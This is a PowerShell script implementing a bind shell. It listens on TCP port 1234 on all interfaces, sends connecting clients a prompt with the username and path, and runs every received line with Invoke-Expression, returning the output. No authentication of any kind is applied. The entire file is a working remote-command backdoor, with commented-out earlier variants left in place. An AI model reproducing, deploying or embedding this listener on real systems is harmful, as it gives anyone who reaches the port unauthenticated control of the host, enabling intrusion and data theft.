$port = 1234

Write-Host "[*] Building TCP listener socket on 0.0.0.0:${port}..."
$server = [System.Net.Sockets.TcpListener]$port                                  #Create and bind a TCP socket
    
:main while ($true){

    Write-Host "[*] Starting listener..."
    Try{
        $server.start()                                                              #Start Listening on 0.0.0.0:$port
        Write-Host "[*] Listening for connection..."
    } Catch {
        Write-Error $_.Exception.Message
        Write-Warning "Problem binding to 0.0.0.0:$port"
        $server.stop()
        break
    }
                    
    $client = $server.AcceptTcpClient()                                          #Indefinitely wait for and accept connection
    Write-Host "[*] Connection established from client"

    $stream = $client.GetStream()                                                #Get raw data from tcp stream
    Write-Host "[*] Got Stream"

    #[byte[]]$bytes = 0..65535|%{0}                                               #Create a byte array with 65536 elements filled with 0 values

    Write-Host "[*] Creating stream writer..."
    $writer = New-Object System.IO.StreamWriter $stream                         #Create a stream writer

    #Create command prompt as byte
    #$prompt = ([text.encoding]::ASCII).GetBytes("PS [" + ${env:username} + " " + (Get-Location).Path + "]`n> ")

    $prompt = "PS [" + ${env:username} + " " + (Get-Location).Path + "]`n> "

    Write-Host "[*] Sending command prompt to client..."
    #$stream.Write($prompt,0,$prompt.Length)                                      #Send the prompt to the client
    $writer.Write($prompt)                                                        #Send the prompt to the client

    Write-Host "[*] Creating stream reader..."
    $reader = New-Object System.IO.StreamReader $stream                         #Create a stream reader

    #$cmd = $reader.ReadLine()                                                   #Read data from tcp stream as string
    Write-Host "[*] Reading data from stream..."
    #while (($data = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){              #while bytes read from stream is not 0
    while ( ($data = $reader.ReadLine()).Length -ne 0){
        Write-Host "[*]Read data from stream..."

        #Write-Host "[*] Converting data to string..."
        #$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding            #Get data from client in bytes and convert to ascii text
        #$cmd = $EncodedText.GetString($bytes,0, $data)
        $cmd = $data

        if ($cmd -match "kill"){
            Write-Host "[*] Disconnecting from client..."
            $reader.Dispose()                                                   #Destroy reader
            $writer.Dispose()                                                   #Destroy writer
            $stream.Dispose()                                                    #Destroy stream
            $client.Dispose()                                                    #Disconnect from client
            $server.stop()                                                       #Stop listener
            break main
        }

        if ( ($cmd) -and ($cmd -notmatch "exit") -and ($cmd -ne ([char]4)) ){    #If $cmd is not null and it doesn't equal exit

            Write-Host "[*] Running command: $cmd"
            $output_string = (Invoke-Expression -Command $cmd 2>&1 | Out-String )#Execute the command from the client on the server
            #$cmdOutput = Invoke-Command {$cmd}                                  #Execute the command and get output
            Write-Host "[*] Command Output:`n $output_string"

            #Write-Host "[*] Converting command output to bytes..."
            #$output = $writer.Write($cmdOutput)                                 #Write cmd output to stream
            #$output_bytes = ([text.encoding]::ASCII).GetBytes($output_string)    #Convert string output to bytes

            Write-Host "[*] Sending command output to the client..."
            #$stream.Write($output_bytes,0,$output_bytes.Length)                  #Write bytes to stream
            $writer.Write($output_string)
            $stream.Flush()                                                      #Flush the stream
            #$stream.Write($prompt,0,$prompt.Length)
            $writer.Write($prompt)
            $stream.Flush()                                                      #Flush the stream

        } else {

            Write-Host "[*] Disconnecting from client..."
            $stream.Dispose()                                                    #Destroy stream
            $reader.Dispose()                                                   #Destroy reader
            $writer.Dispose()                                                   #Destroy writer
            $client.Dispose()                                                    #Disconnect from client
            $server.stop()                                                       #Stop listener
            break                                                                #Go back and listen for connection
        }
    }  
}